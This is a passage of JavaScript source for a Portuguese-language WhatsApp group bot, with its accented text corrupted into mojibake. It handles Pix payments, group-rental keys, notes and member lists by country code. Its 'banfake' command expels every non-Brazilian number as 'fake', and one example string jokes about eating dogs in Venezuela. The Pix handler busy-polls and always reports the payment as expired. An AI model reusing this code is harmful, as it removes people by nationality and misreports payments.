`â€¢ Se vocÃª selecionar o modo de horas e o anÃºncio estiver setado em ${sendHours("HH:mm")} por exemplo, os minutos serÃ£o excluÃ­dos, ficando apenas ${sendHours("HH")}:00
â€¢ Se vocÃª selecionar o modo em minutos e o anÃºncio estiver setado em ${sendHours("HH:mm")} por exemplo, o tempo serÃ¡ convertido no horÃ¡rio mais prÃ³ximo de um mÃºltiplo de 5, restanto o tempo ${converterMin(contarMin(sendHours("HH:mm")) - (contarMin(sendHours("HH:mm")) % 5))}`}, yoko, sender, [
{type: `cmd`, text: `ğŸ•› RETIRAR HORAS ğŸ•›`, command: prefix+command+` `+idads+`|h`},
{type: `cmd`, text: `ğŸ•• RETIRAR MINUTOS ğŸ••`, command: prefix+command+` `+idads+`|m`}], seloctt)
AB = groupAds.map(i => i.id).indexOf(idads)
antes = groupAds[AB].tempo
dps = typeads == `h` ? antes.split(":")[0] + `:00` : converterMin(contarMin(antes) - (contarMin(antes) % 5))
groupAds[AB].tempo = dps
saveADS()
reply(`*O anÃºncio de ID ${idads} foi atualizado de ${antes} para ${dps} com sucesso* âœ”`)
break

case 'teste':
if (configSet.version === 'v1') {
    await reply('USANDO O V1')
  } else if (configSet.version === 'v2') {
    await reply('USANDO O V2')
  } else if (configSet.version === 'v3') {
    await reply('USANDO O V3')
  } else {
    console.log('VersÃ£o invÃ¡lida no arquivo de configuraÃ§Ã£o');
  }
  break
  
case 'setmeca':
const version = q
      await changeVersion(version);
      await reply('SETADO COM SUCESSO')
break

  
case 'pix':
if(!q) return reply('*CADE O VALO DO PIX?*')
reply('*â¯â¯ GERANDO PIX â®â®*')

    try {
        let descricao = 'teste'; 
    let nmsr = Number(q); 
    
        const idempotencyKey = uuidv4();
        await sleep(500)
        let pagamentoInfo = await criarPagamentoPix(nmsr, descricao, idempotencyKey);

 await yoko.sendMessage(sender, { 
            image: Buffer.from(pagamentoInfo.qr_code_base64, "base64"), 
            caption: `*â¯â¯ PIX GERADO COM SUCESSO â®â®*\n*Acima contÃ©m o Qr code para efetuar o pagamento, mais caso precise abaixo sera enviado o pix copia e cola*\n*ID:* ${pagamentoInfo.id}\n*STATUS:* ${pagamentoInfo.status}\n*â¯â¯ CÃ“DIGO COPIA E COLA ABAIXO â®â®â†´*` 
        });
        await yoko.sendMessage(from, { 
            text: `${pagamentoInfo.qr_code}` 
        });
    let check = await verificarPix(pagamentoInfo.id);
    
    while(check.status == 'pending') { check = await verificarPix(pagamentoInfo.id) }
    if(check.status == "approved") {
   await reply(`*â¯â¯ PAGAMENTO CONFIRMADO â®â®\n*ADICIONANDO COINS*`)
   await sleep(500)
   await reply('MUITO OBRIGADO PELA A SUA CONTRIBUIÃ‡ÃƒO')
    }
    reply("Pagamento expirado ãƒ…")
    } catch (error) {
        await yoko.sendMessage(from, { text: `Erro ao criar o pagamento: ${error.message}` });
    }
    break;
case 'stickerinfo': case 'stmetadata': 
if(!isQuotedSticker) return reply('Por favor, Ã© nescessÃ¡rio mencionar um sticker para obter sucesso Ã  execuÃ§Ã£o do comando.');
try {
  extractBuffer = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
  stickerMetadata = await extractMetadata(extractBuffer);
  await yoko.sendMessage(from, {image: extractBuffer, caption: `â€¢ Emojis: *${stickerMetadata?.emojis?.join(' ') || 'âŒ'}*\nâ€¢ ID do Pacote: *${stickerMetadata['sticker-pack-id'] || 'âŒ'}*\nâ€¢ Nome do Pacote: *${stickerMetadata['sticker-pack-name'] || 'âŒ'}*\nâ€¢ Autor do Pacote:  *${stickerMetadata['sticker-pack-publisher'] || stickerMetadata['sticker-author-name'] || 'âŒ'}*\nâ€¢ Sticker Maker _(Android)_: *${stickerMetadata['android-app-store-link'] || 'âŒ'}*\nâ€¢ Sticker Maker _(iOS)_: *${stickerMetadata['ios-app-store-link']|| 'âŒ'}*`}, {quoted: selo});
} catch(error) {
  return reply('[#] Ocorreu um erro ao obter a metadata do sticker, tente com outro...')
};
break

case 'savegp':
if(!SoDono) return reply(mess.onlyOwner())
if(!isGroup) return reply(mess.onlyGroup())
if(!VerificarJSON(grupos, from)) {
grupos.push({id: from, limite: 5, validado: true})
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
reply(`Grupo *"${groupName}"* acaba de ser salvo em meu banco de dados...`)
} else {
GP = grupos.map(i => i.id).indexOf(from)
grupos[GP].validado = true
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
reply(`Grupo *"${groupName}"* jÃ¡ foi salvo em meu banco de dados, entÃ£o sÃ³ irei ativar o recurso de validado senhor(a)...ï¸`)
}
break

case 'addrent': case 'rgrent':
if(!SoDono) return reply(mess.onlyOwner())
if(!isGroup) return reply(mess.onlyGroup())
if(!VerificarJSON(grupos, from)) {
grupos.push({id: from, limite: 5, validado: true})
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
} else {
GP = grupos.map(i => i.id).indexOf(from)
grupos[GP].validado = true
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
}
if(!JSON.stringify(aluguel).includes(from)) {
if(!q.includes('/')) return reply(`VocÃª vai colocar o nÃºmero da pessoa que alugou e apÃ³s isso uma barra ( / ). ApÃ³s a barra, coloque a quantidade de dias que este alugou para seu grupo.\n- Ex: ${prefix+command} ${nmrdn.split('@')[0]}/30`)
barra = q.replace(" /", "/").replace("/ ", "/").replace(" / ", "/")
var [nmr, dias] = barra.split('/')
if(!Number(dias)) return reply(`Apenas nÃºmeros pfvr`)
matheuzinho = nmr.includes('@') ? nmr.split('@')[1].replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net" : nmr.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const [checkwpp] = await yoko.onWhatsApp(matheuzinho.split('@')[0])
if(checkwpp == undefined) {
return reply(`O nÃºmero ${matheuzinho.split('@')[0]} nÃ£o Ã© vÃ¡lido no whatsapp...`)
}
if(Number(dias) <= 0) return reply(`Ã‰ necessÃ¡rio ao menos 1 dia de aluguel nÃ©.`);
if(dias.includes('.')) return reply("NÃ£o use nÃºmeros decimais.");
aluguel.push({id: from, nome: groupName, tempo: Number(dias) + 1, totalRent: Number(dias) + 1, cliente: matheuzinho, save: Number(moment.tz('America/Sao_Paulo').format('DD')), cortesia: false});
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2));
reply(`Grupo adicionado ao aluguel com sucesso.`);
} else {
if(!Number(args[0])) return reply(`Coloque quantos dias mais serÃ£o adicionados ao aluguel deste grupo!`);
hehe = Number(args[0])
AB = aluguel.map(i => i.id).indexOf(from)
aluguel[AB].cortesia = false
aluguel[AB].nome = groupName
aluguel[AB].totalRent = aluguel[AB].tempo + hehe
aluguel[AB].tempo += hehe
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2));
reply(`+${args[0]} dia${Number(args[0]) > 1 ? 's' : ''} adicionado${Number(args[0]) > 1 ? 's' : ''} para este grupo.`);
}
break

case 'tirarrent':
if(!SoDono) return reply(mess.onlyOwner())
if(!isGroup) return reply(mess.onlyGroup())
if(!Number(args[0])) return reply("Apenas nÃºmeros.");
if(!JSON.stringify(aluguel).includes(from)) return reply("ID inexistente.");
AB = aluguel.map(i => i.id).indexOf(from)
aluguel[AB].cortesia = false
aluguel[AB].nome = groupName
aluguel[AB].tempo -= Number(args[0])
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
reply(`${args[0]} dia${Number(args[0]) > 1 ? 's' : ''} fo${Number(args[0]) > 1 ? 'ram' : 'i'} retirado${Number(args[0]) > 1 ? 's' : ''} deste grupo.`)
break

case 'delrent': case 'rmrent':
if(!SoDono) return reply(mess.onlyOwner())
if(!isGroup) return reply(mess.onlyGroup())
if(!q) {
if(!JSON.stringify(aluguel).includes(from)) return reply(`ID inexistente`)
GP = grupos.map(i => i.id).indexOf(from)
grupos.splice(GP, 1)
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
AB = aluguel.map(i => i.id).indexOf(from)
aluguel.splice(AB, 1)
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
reply(`O registro desse grupo foi deletado com sucesso do meu banco de dados.`)
} else {
if(!Number(args[0]) || Number(args[0]) < 0 || Number(args[0]) > Number(aluguel.length + 1)) return reply(`Retorne um nÃºmero vÃ¡lido... Olhe na ${prefix}listrent e veja o nÃºmero`)
BC = Number(args[0]) - 1
GP = grupos.map(i => i.id).indexOf(aluguel[BC].id)
grupos.splice(GP, 1)
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
aluguel.splice(BC, 1)
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
reply(`O registro desse grupo foi deletado com sucesso do meu banco de dados.`)
}
break

case 'cortesia24':
if(!SoDono) return reply(mess.onlyOwner())
if(!isGroup) return reply(mess.onlyGroup())
if(JSON.stringify(aluguel).includes(from)) return reply(`Grupo jÃ¡ registrado...`)
if(!JSON.stringify(grupos).includes(from)) {
  grupos.push({id: from, limite: 5, validado: true})
  fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
}
aluguel.push({id: from, nome: groupName, tempo: 24, totalRent: 24, cliente: nmrdn, save: Number(moment.tz('America/Sao_Paulo').format('mm')), cortesia: true})
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
reply(`ğŸ’³ CartÃ£o verde validado! 24h liberadas neste grupo contando a partir de agora.`)
break

case 'listrent': case 'lista-aluguel':
if(!SoDono) return reply(mess.onlyGroup())
if(aluguel.length > 0) {
var getGroups = await yoko.groupFetchAllParticipating()
var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var ingfoo = groups.map(v => v)
ingfoo.sort((a, b) => (a[0] < b.length))
for (g = 0; g < ingfoo.length; g++){
if(JSON.stringify(aluguel).includes(ingfoo[g].id)) {
matheuzinho = aluguel.map(m => m.id).indexOf(ingfoo[g].id)
aluguel[matheuzinho].nome = ingfoo[g].subject
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
}
}
txte = `[Total: *${aluguel.length}*] - Lista dos grupos alugados:\nâ€”\n`
for(i = 0; i < aluguel.length; i++) {
hmm = aluguel[i].tempo
txte += `*[${i + 1}]* Grupo: *${aluguel[i].nome}*\n`
if(aluguel[i].cortesia == false) {
txte += `â€¢ Tempo Restante: *${hmm} dia${hmm > 1 ? 's' : ''}*\nâ€¢ Cliente: *wa.me/${aluguel[i].cliente.split('@')[0]}*\nâ€”\n`
} else {
txte += `_O grupo estÃ¡ usando o cartÃ£o cortesia, ou seja, 24h de uso foram liberadas._\nâ€”\n`
}
}
reply(txte)
} else {
reply(`NÃ£o existe nenhum grupo registrado em aluguel senhor(a).`)
}
break

case 'lastrent':
if(!SoDono) return reply(mess.onlyOwner())
if(aluguel.length > 0) {
matheuzinho = aluguel.map(i => i)
rank = matheuzinho.sort((a, b) => (a.tempo < b.tempo) ? -1 : 0)
txtad = "â€¢ Top 3 grupos com o aluguel mais prÃ³ximo de acabar:\nâ€”\n"
for(i = 0; i < 3; i++) {
if(rank[i].cortesia == false) {
hmm = rank[i].tempo
txtad += `*[${i + 1}]* Grupo: *${rank[i].nome}*\nâ€¢ Tempo Restante: ${hmm} dia${hmm > 1 ? 's' : ''}\nâ€¢ Cliente: *wa.me/${rank[i].cliente.split('@')[0]}*\nâ€”\n`
}
}
reply(txtad)
} else {
reply(`NÃ£o existe nenhum grupo registrado em aluguel senhor(a).`)
}
break

case 'calendario':
case 'dados':
setTimeout(() => {reagir(from, "ğŸ“…")}, 300)
var getGroups = await yoko.groupFetchAllParticipating()
var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var ingfoo = groups.map(v => v)
ingfoo.sort((a, b) => (a[0] < b.length))
hora16 = moment.tz('America/Sao_Paulo').format('HH:MM:SS')
date16 = moment.tz('America/Sao_Paulo').format('DD/MM/YYYY')
day = `${tempo}, ${pushname}!\nâ€¢ Grupo: *${isGroup ? groupName : "Privado"}*\nâ€¢ Data & Hora: *${date16} ${hora16}*\nâ€¢ Nome do Bot: *${NomeDoBot}*\nâ€¢ ProprietÃ¡rio: *${ownerName}*\nâ€¢ Estou operando atualmente em *${ingfoo.length}* grupos.`
if(JSON.stringify(aluguel).includes(from)) {
AB = aluguel.map(i => i.id).indexOf(from)
numsei = aluguel[AB].tempo / aluguel[AB].totalRent * 100
if(numsei < 10) matheuzinho = `${numsei.toFixed(0)}%ã€˜â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ã€™`
if(numsei >= 10) matheuzinho = `${numsei.toFixed(0)}%ã€˜â–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’ã€™`
if(numsei >= 20) matheuzinho = `${numsei.toFixed(0)}%ã€˜â–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’ã€™`
if(numsei >= 30) matheuzinho = `${numsei.toFixed(0)}%ã€˜â–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’ã€™`
if(numsei >= 40) matheuzinho = `${numsei.toFixed(0)}%ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’ã€™`
if(numsei >= 50) matheuzinho = `${numsei.toFixed(0)}%ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’ã€™`
if(numsei >= 60) matheuzinho = `${numsei.toFixed(0)}%ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’ã€™`
if(numsei >= 70) matheuzinho = `${numsei.toFixed(0)}%ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’ã€™`
if(numsei >= 80) matheuzinho = `${numsei.toFixed(0)}%ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’ã€™`
if(numsei >= 90) matheuzinho = `${numsei.toFixed(0)}%ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’ã€™`
if(numsei >= 95) matheuzinho = `${numsei.toFixed(0)}%ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆã€™`
hmm = aluguel[AB].tempo
if(aluguel[AB].cliente == sender || SoDono) {
  matheusSabe = `â€¢ `
  if(aluguel[AB].cortesia == false) {
matheusSabe += `${hmm} dia${hmm > 1 ? 's' : ''} restantes`} else {matheusSabe += hmm > 1 ? `${hmm} horas` : `Alguns minutos`}
matheusSabe += ` atÃ© o fim do contrato.`
} else {matheusSabe = ``}
day += `\nâ€”â€”\nğŸ”‹ *Bateria restante para uso:*\n${matheuzinho} ${matheusSabe}`};
reply(`${day}`);
break

case 'aluguel': case 'alugueis': case 'alugar': case 'alugarbot': case 'loja':
await reagir(from, "ğŸ›’")
reply(`Digite *${prefix}dono* para entrar em contato com meu proprietÃ¡rio e liberar o acesso em seu grupo.\nâ€¢ Os valores sÃ£o passados por ele, nÃ£o tenho nenhuma informaÃ§Ã£o registrada sobre isso.`)
break

case 'mycoderent': //by matheuzinho
txtfd = `ğŸ”‘ Suas chaves de ativaÃ§Ã£o:\nâ€”\n`
nmr = 0
for(i of chaves) {if(i.cliente == sender) {txtfd += `\nâ€¢ ${i.key}`; nmr += 1}}
if(nmr <= 0) return reply("VocÃª nÃ£o possui nenhuma chave de ativaÃ§Ã£o.");
reply(isGroup ? "Por seguranÃ§a lhe enviei em seu privado o que foi solicitado." : "Aguarde, estou enviando o que foi solicitado...");
await sendText(sender, txtfd);
break

case 'codelistrent'://by matheuzinho
if(!SoDono) return reply(mess.onlyOwner())

caixa = []
for(i of chaves) {
txsft = `[Total: *${i.chaves}*] - Lista de CÃ³digos registrado(s) para aluguel:`
txsft += `\nâ€”\nâ€¢ Chave: *${i.key}*\nâ€¢ Cliente que realizou a solicitaÃ§Ã£o: *@${i.cliente.split('@')[0]}*\nâ€¢ ExpiraÃ§Ã£o: ${nmr > 0 ? `${i.dias} dia${i.dias > 1 ? 's' : ''}` : `NÃ£o contÃ©m dias para a expiraÃ§Ã£o, Ã© infinito.`}`
caixa.push(i.cliente)
}
if(caixa <= 0) return reply("NÃ£o existe nenhuma chave registrada em meu banco de dados.")
reply(isGroup ? "Por motivos de seguranÃ§a, enviei em seu privado..." : "Aguarde, estou enviando o que foi solicitado!")
await yoko.sendMessage(sender, {text: txsft, mentions: caixa})
break

case 'gerarcoderent':
if(!SoDono) return reply(mess.onlyOwner())
barra = q.replace(' /', '/').replace('/ ', '/').replace(' / ', '/')
var [v1, v2] = barra.split('/')
if(!q.includes('/')) return reply(`VocÃª vai colocar o nÃºmero da pessoa que alugou e apÃ³s isso uma barra ( / ). ApÃ³s a barra, coloque a quantidade de dias que este alugou para seu grupo.\nâ€¢ Exemplo: *${prefix+command} ${nmrdn.split('@')[0]}/30*`)
matheuzinho = v1.toLowerCase() == "me" ? sender : v1.includes('@') ? v1.split('@')[1].replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net" : v1.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const [checkkeygp] = await yoko.onWhatsApp(matheuzinho.split('@')[0])
if(checkkeygp == undefined) {
return reply(`O nÃºmero *${matheuzinho.split('@')[0]}* nÃ£o Ã© vÃ¡lido no whatsapp.`)
}
nmr = Number(v2) > 0 ? Number(v2) : 0
idks = `G${v2}-`
idks += `${Number(from.replace("-", "").slice(2, 8)) * Number(matheuzinho.slice(2, 8))}`
idks += `M${nmr}H-${Number(moment.tz('America/Sao_Paulo').format('DDMMYY')) + Number(moment.tz('America/Sao_Paulo').format('HHmmss'))}B`
chaves.push({key: idks, tipo: 1, dias: nmr, cliente: matheuzinho, valor: 0})//tipo 1 = aluguel de grupo
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/chaves.json", JSON.stringify(chaves, null, 2))
await mention(`ğŸ”‘â™¦ï¸ CÃ³digo de ativaÃ§Ã£o do serviÃ§o gerado com sucesso! Segue abaixo a chave:\n-> *${idks}*\nâ€”â€”\nâ€¢ Quantidade de dias: *${nmr > 0 ? `${nmr} dia${nmr > 1 ? 's' : ''}` : `âˆ INFINITO`}*\nâ€¢ UsuÃ¡rio(a) que alugou: *@${matheuzinho.split('@')[0]}*`)
break

case 'gerarcodecort'://by matheuzinho
if(!SoDono) return reply(mess.onlyOwner())
reagir(from, "ğŸ˜€")
cort = 24 
idks = `G${cort}-`
idks += `${Number(from.replace("-", "").slice(2, 8)) * Number(sender.slice(2, 8))}`
idks += `E${Number(cort/2).toFixed(0)}R-${Number(moment.tz('America/Sao_Paulo').format('DDMMYY')) + Number(moment.tz('America/Sao_Paulo').format('HHmmss'))}A`
chaves.push({key: idks, tipo: 2, dias: 24, cliente: sender, valor: 0})//tipo 3 = cortesia
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/chaves.json", JSON.stringify(chaves, null, 2))
reply(`ğŸ›’â™¦ï¸ O cÃ³digo cortesia foi gerado com sucesso! Segue abaixo a chave de ativaÃ§Ã£o do mesmo:\n-> *${idks}*`)
break

case 'delcoderent':
if(!SoDono) return reply(mess.onlyOwner())
if(!JSON.stringify(chaves).includes("Ayanokoji V1 Md -oficial")) return reply(`NÃ£o hÃ¡ chaves registradas.`)
if(!q) return reply(`CadÃª o cÃ³digo de aluguel que vocÃª deseja apagar?`)
if(!JSON.stringify(chaves).includes(q)) return reply("O cÃ³digo nÃ£o foi encontrado em nosso banco de dados, Ã© inexistente!")
AD = chaves.map(i => i.key).indexOf(q)
chaves.splice(AD, 1)
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/chaves.json", JSON.stringify(chaves, null, 2))
reply(`[!] O cÃ³digo *${q}* foi deletado do sistema com sucesso.`)
break

case 'iddogrupo':
if(!SoDono) return reply(mess.onlyOwner())
reply(from)
break

//=========== [ ÃNICIO JOGOS ] ========= //

case 'quando':  
if (args.length < 1) return reply('Digite a pergunta!')
const meupirul = ['Hoje', 'AmanhÃ£', 'Nunca', 'dia', 'semana', 'mÃªs', 'ano']
const meupirul2 = ['dias', 'semanas', 'meses', 'anos']
randomm = meupirul[Math.floor(Math.random() * meupirul.length)]
random2 = `${Math.floor(Math.random() * 11) + 1}`
if (randomm == 'Hoje' || randomm == 'AmanhÃ£' || randomm == 'Nunca') {
texto = `Pergunta: ${body.slice(1)}\nResposta: ${randomm}`
} else if (random2 == 1) {
texto = `Pergunta: ${body.slice(1)}\nResposta:  1 ${randomm}`
} else {
random3 = meupirul2[Math.floor(Math.random() * meupirul2.length)]
texto = `Pergunta: ${body.slice(1)}\nResposta: ${random2} ${random3}`
}
reply(texto)
break

//=========== [ FINAL JOGOS ] ========= //

case 'banfake': case 'banfakes':
if(!isGroup) return reply(enviar.msg.grupo)
if(!isGroupAdmins) return reply(enviar.msg.adm)
caixa = []
for(i of somembros) {
  if(!numerodono.includes(i) && !botNumber.includes(i)) {
    if(Number(i.slice(0, 2)) !== 55) caixa.push(i)
  }
}
if(caixa.length > 0) {
  for(a = 0; a < caixa.length; a++) {
    await sleep(1000)
    remover(from, caixa[a])
  }
} else reply("NÃ£o hÃ¡ nÃºmeros fake presentes neste grupo...")
break

case 'listafake': case 'listafakes':
if(!isGroup) return reply(enviar.msg.grupo)
if(!isGroupAdmins) return reply(enviar.msg.adm)
reagir(from, "ğŸ‡ºğŸ‡¸")
txt = `ğŸ‡ºğŸ‡¸ *Lista de nÃºmeros fake presentes neste grupo:*\n`
let totalfake = 0
for(i = 0; i < groupMembers.length; i++) {
  if(groupMembers[i].id.split(groupMembers[i].id.slice(2))[0] === ("55")) {} else {
    txt += `â‡’ ${isGroupAdmins ? '@' : 'wa.me/'}${groupMembers[i].id.split("@")[0]}\n`
    totalfake += 1
  }
}
txt += `\nğŸ‡ºğŸ‡¸ Total: ${totalfake}`
if(totalfake > 0) {
  var resp = isGroupAdmins ? mention : reply
  resp(txt)
} else {
  reply("NÃ£o hÃ¡ nÃºmeros fake neste grupo...")
}
break

case 'brlist': case 'listabr':
if(!isGroup) return reply(enviar.msg.grupo)
reagir(from, "ğŸ‡§ğŸ‡·")
txt = `ğŸ‡§ğŸ‡· *Lista de nÃºmeros brasileiros presentes neste grupo:*\n`
let totalbr = 0
for(i = 0; i < groupMembers.length; i++) {
  if(groupMembers[i].id.split(groupMembers[i].id.slice(2))[0] === ("55")) {
    if(groupMembers[i].id.includes(botNumber)) {} else {
      txt += `â‡’ ${isGroupAdmins ? '@' : 'wa.me/'}${groupMembers[i].id.split("@")[0]}\n`
      totalbr += 1
    }
  }
}
txt += `\nğŸ‡§ğŸ‡· Total: ${totalbr}`
if(totalbr > 0) {
  var resp = isGroupAdmins ? mention : reply
  resp(txt)
} else {
  reply("NÃ£o hÃ¡ nÃºmeros brasileiros neste grupo...")
}
break

case 'listaddi': case 'ddilist':
if(!isGroup) return reply(mess.onlyGroup());
if(!isGroupAdmins) return reply(mess.onlyAdmins());
if(q.length < 1) return reply(`Fale o cÃ³digo de um paÃ­s, por exemplo: *${prefix}listaddi 55*`)
if(isNaN(q)) return reply(`Fale o cÃ³digo de um paÃ­s, por exemplo: *${prefix}listaddi 55*`)
teks = `â€¢ NÃºmero com cÃ³digo de paÃ­s +${args[0]} registrados no grupo:\nâ€“\n`
men = []
for(let mem of groupMembers) {
if(mem.id.startsWith(q)) {
teks += `â‡’ @${mem.id.split('@')[0]}\n`
men.push(mem.id)
}
}
if(teks.indexOf('â‡’') < 0) return reply(`Nenhum nÃºmero com o DDI *+${args[0]}* foi encontrado.`)
await yoko.sendMessage(from, {text: teks, mentions: men}, {quoted: selo}).catch(async(error) => {
reply(mess.error())
})
break

case 'listaddd': case 'dddlist':
if(!isGroup) return reply(mess.onlyGroup());
if(!isGroupAdmins) return reply(mess.onlyAdmins());
if(q.length < 1) return reply(`Fale o cÃ³digo do estado, por exemplo: *${prefix}listaddd 82*`)
if(isNaN(q)) return reply(`Fale o cÃ³digo de um estado(ddd), por exemplo: *${prefix}listaddd 82*`)
teks = `â€¢ Lista de nÃºmeros brasileiros com o DDD *${q}* presentes neste grupo:\nâ€“\n`
men = []
for (let mem of groupMembers) {
if(mem.id.startsWith(55+q)) {
teks += `â‡’ @${mem.id.split('@')[0]}\n`
men.push(mem.id);
}
}
if(teks.indexOf('â‡’') < 0) return reply('Nenhum *nÃºmero brasileiro* com DDD fornecido foi encontrado no grupo.')
await yoko.sendMessage(from, {text: teks, mentions: men}, {quoted: selo}).catch(async(error) => {
reply(mess.error())
})
break

case 'limpar_mortos-cnt':
if(!SoDono) return reply(mess.onlyOwner())
if(!isGroup) return reply(mess.onlyOwner())
bla = [] 
var CNT_RS = countMessage[countMessage.map(i => i.groupId).indexOf(from)].numbers
for ( i = 0; i < CNT_RS.map( i => i.id).length; i++) { bla.push(CNT_RS.map( i => i.id)[i])};
for ( i of groupMembers) {bla.splice(bla.indexOf(i.id), 1)};
for ( i of bla) {CNT_RS.splice(CNT_RS.indexOf(i), 1)};
fs.writeFileSync("./yoko/configs/media/countmsg.json", JSON.stringify(countMessage))
reply("UsuÃ¡rios que jÃ¡ foi removido, ou saiu do grupo, foi tirado do contador de mensagens..")
break

case 'tirar_docnt':
if(!SoDono) return reply(mess.onlyOwner())
if(!isGroup) return reply(mess.onlyGroup())
var i2 = countMessage.map(i => i.groupId).indexOf(from) 
var i = countMessage[i2].numbers.map(i => i.id).indexOf(q.trim()+"@s.whatsapp.net")  
countMessage[i2].numbers.splice(i,1)
fs.writeFileSync("./yoko/configs/media/countmsg.json", JSON.stringify(countMessage))
reply("UsuÃ¡rio tirado do contador de mensagens com sucesso...")
break

case 'anotar':
case 'tirar_nota':
case 'rmnota':
if(!isGroup) return reply(`SÃ³ em grupo pode utilizar este comando.`)
if(!isGroupAdmins) return reply(`SÃ³ adm pode utilizar este tipo de comando.`)
if(command == "anotar") {
var [q5, q10] = q.trim().split("|")
if(!q5 || !q10 || !q.includes("|")) return reply(`Digite o tÃ­tulo da anotaÃ§Ã£o e o texto que deseja anotar..\nExemplo: ${prefix}anotar Cachorro|Cachorros sÃ£o bom pra comer na Venezuela...`)
if(JSON.stringify(anotar).includes(from)) {  
var i2 = anotar.map(i => i.grupo).indexOf(from)  
if(JSON.stringify(anotar[i2].puxar).includes(q5)) {
var i3 = anotar[i2].puxar.map(i => i.nota).indexOf(q5)  
if(anotar[i2].puxar[i3].nota == q5) return reply(`Esta anotaÃ§Ã£o jÃ¡ estÃ¡ inclusa, utilize outro tÃ­tulo.. Ou vocÃª pode tirar com\n${prefix}tirar_nota ${q5}`)
}
}
if(!JSON.stringify(anotar).includes(from)) {
anotar.push({grupo: from, puxar: [{nota: q5, anotacao: q10}]})
fs.writeFileSync("./yoko/bunker/database/func/anotar.json", JSON.stringify(anotar))
reply("AnotaÃ§Ã£o registrada com sucesso...")
} else {
anotar[i2].puxar.push({nota: q5, anotacao: q10})
fs.writeFileSync("./yoko/bunker/database/func/anotar.json", JSON.stringify(anotar))
reply("AnotaÃ§Ã£o registrada com sucesso...")  
}
} else {
if(!q) return reply("Digite qual anotaÃ§Ã£o deseja tirar pelo tÃ­tulo..")
if(JSON.stringify(anotar).includes(from)) {  
var i2 = anotar.map(i => i.grupo).indexOf(from)  
if(JSON.stringify(anotar[i2].puxar).includes(q)) {
var i3 = anotar[i2].puxar.map(i => i.nota).indexOf(q)  
}
}
if(0 > anotar[i2].puxar.map(i => i.nota).indexOf(q)) return reply("Esta nota nÃ£o estÃ¡ inclusa, verifique com atenÃ§Ã£o...")
anotar[i2].puxar.splice(i3, 1)
fs.writeFileSync("./yoko/bunker/database/func/anotar.json", JSON.stringify(anotar))
reply(`AnotaÃ§Ã£o ${q} tirada com sucesso...`)
}
break

case 'anotacao':
case 'anotacoes':  
case 'nota':
case 'notas':
if(!isGroup) return reply(`SÃ³ em grupo pode utilizar este comando.`)
if(command == "anotacao" || command == "nota") {
if(!q) return reply("Digite o tÃ­tulo da anotaÃ§Ã£o que deseja puxar..")
if(!JSON.stringify(anotar).includes(from)) return reply("Este grupo nÃ£o tem nenhuma anotaÃ§Ã£o...")
var i2 = anotar.map(i => i.grupo).indexOf(from)  
if(!JSON.stringify(anotar[i2].puxar).includes(q)) return reply("NÃ£o contÃ©m nenhuma anotaÃ§Ã£o com este tÃ­tulo.")
var i3 = anotar[i2].puxar.map(i => i.nota).indexOf(q)  
mentions(`ã€ˆ ${anotar[i2].puxar[i3].anotacao} ã€‰`)
} else {
var i2 = anotar.map(i => i.grupo).indexOf(from)    
if(anotar[i2].puxar.length == 0) return reply("Este grupo nÃ£o tem nenhuma anotaÃ§Ã£o...")    
var i2 = anotar.map(i => i.grupo).indexOf(from) 
var antr = anotar[i2].puxar 
txtin = `Aqui estÃ¡ todas as anotaÃ§Ãµes registradas em minha database do grupo: *[ ${groupName} ]*\n`
for ( i = 0; i < antr.length; i++) {
